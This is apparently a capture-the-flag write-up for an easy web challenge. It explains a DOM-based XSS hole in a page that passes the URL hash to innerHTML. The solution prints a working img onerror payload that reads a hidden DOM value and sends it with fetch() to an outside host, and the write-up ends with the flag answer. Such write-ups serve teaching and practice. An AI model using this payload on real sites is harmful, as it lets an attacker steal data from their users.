# 📡 Public Echo

**🏷️ Category**: Web  
**🟢 Difficulty**: Easy  
**📖 Description**:  
We found a public messaging demo running on an internal server. It echoes your message directly in the chat using the URL hash — “stateless and secure,” they claimed.  
But the flag is hidden right in the DOM… and only JavaScript can reveal it.  
Prove this “secure” echo is anything but.

---

### 💥 Solution

The page reads user input from `window.location.hash` (e.g., `#msg=hello`) and inserts it **unsafely into the DOM** using `innerHTML`. This leads to a classic **DOM-based XSS via HTML injection**.

1. The flag is stored invisibly in the DOM:
   ```html
   <span id="secret-flag" data-flag="CTF{h4sh_b4s3d_xss_1s_r3al}"></span>
   ```
2. Since <script> tags don’t execute when injected via innerHTML, we use an auto-firing HTML event like onerror or onload. 

3. Inject a payload that exfiltrates the flag:
   ```text
   <img src=x onerror="fetch('http://your-checker.onrender.com/submit?flag='+encodeURIComponent(document.getElementById('secret-flag').dataset.flag))">
   ```
---

### 🏁 Flag

**CTF{h4sh_b4s3d_xss_1s_r3al}**
